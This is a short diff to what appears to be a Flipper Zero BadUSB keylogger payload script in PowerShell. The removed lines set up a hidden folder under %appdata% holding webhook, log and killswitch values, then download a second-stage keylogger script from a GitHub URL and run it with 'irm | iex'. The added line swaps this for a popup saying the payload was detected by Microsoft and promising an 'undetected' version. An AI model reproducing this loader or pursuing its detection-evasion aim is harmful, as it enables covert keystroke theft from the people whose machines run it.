@@ -1,7 +1,1 @@
-if (![System.IO.Directory]::Exists("$env:appdata\-locker")){New-Item -ItemType Directory -Force -Path "$env:appdata\-locker"};
-echo $dc > "$env:appdata\-locker\wh.txt";
-echo $log > "$env:appdata\-locker\log.txt";
-echo $ks > "$env:appdata\-locker\killswitch.txt";
-
-irm https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/s2.ps1 | iex
-
+$done = New-Object -ComObject Wscript.Shell;$done.Popup("This payload has been detected by Microsoft. An updated undetected version will be released as soon as possible",10)
